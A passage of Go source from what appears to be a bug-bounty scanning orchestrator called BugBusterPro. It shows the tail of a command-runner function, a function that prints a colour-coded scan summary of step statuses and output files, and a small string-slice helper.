	var cmd *exec.Cmd
	if step.RequiresPipe { cmd = exec.Command("sh", "-c", step.Command) } else {
		parts := strings.Fields(step.Command); if len(parts) == 0 { return fmt.Errorf("empty command") }; cmd = exec.Command(parts[0], parts[1:]...)
	}
	var stderr bytes.Buffer; cmd.Stderr = &stderr
	err := cmd.Start()
	if err != nil { if stderr.Len() > 0 { config.Logger.Printf(colorRed+"[stderr] %s"+colorReset, stderr.String()) }; return fmt.Errorf("failed to start command: %w", err) }
	err = cmd.Wait()
	if stderr.Len() > 0 { scanner := bufio.NewScanner(&stderr); for scanner.Scan() { config.Logger.Printf(colorYellow+"[stderr] %s"+colorReset, scanner.Text()) } }
	if err != nil { return fmt.Errorf("command exited with error: %w", err) }
	return nil
}

// --- printSummary (same as v1.1.1 - shows step status, lists output files) ---
func printSummary(config *Config, steps []StepInfo) {
	config.Logger.Println(colorPurple + "\n===== BugBusterPro Scan Summary =====" + colorReset)
	config.Logger.Printf("Domain: %s", config.Domain)
	config.Logger.Printf("Output Directory: %s", config.OutputDir)
    config.Logger.Printf("Wordlist Used: %s", config.WordlistPath)
    config.Logger.Printf("Nuclei Templates Dir: %s", config.NucleiTemplatesDir)
    if config.InteractshServer != "" { config.Logger.Printf("Interactsh Server: %s", config.InteractshServer) }
	config.Logger.Printf("Scan End Time: %s", time.Now().Format("2006-01-02 15:04:05"))
	completedCount := 0; failedSteps := []string{}; emptyOutputSteps := []string{}
	config.Logger.Println(colorCyan + "\n--- Step Status ---" + colorReset)
	for i, step := range steps {
		status := ""; stepRan := step.Completed
		if stepRan {
            if isStepCompleted(step.OutputFile) { status = colorGreen + "[Completed]" + colorReset; completedCount++
            } else { status = colorYellow + "[Completed (No Output)]" + colorReset; emptyOutputSteps = append(emptyOutputSteps, fmt.Sprintf("%d. %s (%s)", i+1, step.Name, step.OutputFile)); completedCount++ }
        } else {
            if !config.Force && isStepCompleted(step.OutputFile) { status = colorYellow + "[Skipped (Output Exists)]" + colorReset; completedCount++
            } else { status = colorRed + "[Failed]" + colorReset; failedSteps = append(failedSteps, fmt.Sprintf("%d. %s", i+1, step.Name)) }
        }
		config.Logger.Printf("%s %s", status, step.Name)
	}
	config.Logger.Printf("\nSteps Run/Succeeded/Total: %d/%d", completedCount, len(steps))
	if len(failedSteps) > 0 {
		config.Logger.Println(colorRed + "\n--- Failed Steps ---" + colorReset); for _, failed := range failedSteps { config.Logger.Printf("- %s", failed) }; config.Logger.Println(colorRed + "Check the log file for detailed errors." + colorReset)
	}
	if len(emptyOutputSteps) > 0 {
		config.Logger.Println(colorYellow + "\n--- Steps Completed with Missing/Empty Output ---" + colorReset); for _, empty := range emptyOutputSteps { config.Logger.Printf("- %s", empty) }; config.Logger.Println(colorYellow + "These steps ran without error, but their expected output file is empty or was not created." + colorReset)
	}
	if len(failedSteps) == 0 && len(emptyOutputSteps) == 0 { config.Logger.Println(colorGreen + "\nAll steps completed successfully!" + colorReset)
	} else if len(failedSteps) == 0 && len(emptyOutputSteps) > 0 { config.Logger.Println(colorYellow + "\nAll steps ran without errors, but some produced no output. Review the 'No Output' list and logs." + colorReset)
    } else { config.Logger.Println(colorYellow + "\nScan finished, but some steps failed. Please review the logs." + colorReset) }
	config.Logger.Println(colorCyan + "\n--- Key Output Files (if generated and not empty) ---" + colorReset)
	significantFiles := []string{}
	for _, step := range steps { if isStepCompleted(step.OutputFile) { significantFiles = append(significantFiles, step.OutputFile) } }
	if len(significantFiles) > 0 {
		for _, file := range significantFiles {
			fileInfo, err := os.Stat(file); if err == nil { config.Logger.Printf("- %s (%.2f KB)", file, float64(fileInfo.Size())/1024.0) } else { config.Logger.Printf("- %s (Error getting stats: %v)", file, err) }
		}
	} else { config.Logger.Println("No significant output files were found (or they were empty).") }
	config.Logger.Println(colorPurple + "\n===== End of Summary =====" + colorReset)
}


// --- contains (same as v1.1.1) ---
func contains(slice []string, item string) bool { for _, s := range slice { if s == item { return true } }; return false }
